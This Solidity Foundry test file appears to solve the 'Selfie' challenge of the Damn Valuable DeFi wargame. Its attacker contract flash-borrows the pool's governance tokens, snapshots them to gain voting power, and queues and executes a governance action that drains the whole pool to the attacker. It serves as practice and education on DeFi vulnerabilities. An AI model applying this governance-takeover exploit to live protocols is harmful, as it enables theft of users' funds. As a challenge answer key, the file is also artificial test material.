// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";

contract AttackerContract {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvt;
    address internal immutable attacker;

    uint256 internal actionId;

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvt = simpleGovernance.governanceToken();
        attacker = msg.sender;
    }

    function queueAction() external {
        selfiePool.flashLoan(dvt.balanceOf(address(selfiePool)));
    }

    function receiveTokens(address _dvt, uint256 amount) external {
        dvt.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        dvt.transfer(address(selfiePool), amount);
    }

    function finishAttack() external {
        simpleGovernance.executeAction(actionId);
        dvt.transfer(attacker, dvt.balanceOf(address(this)));
    }
}

contract Selfie is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);

        AttackerContract attackerContract = new AttackerContract(
            simpleGovernance,
            selfiePool
        );
        vm.label(address(attackerContract), "AttackerContract");
        attackerContract.queueAction();

        // Wait for the next round
        vm.warp(block.timestamp + 2 days);

        attackerContract.finishAttack();

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
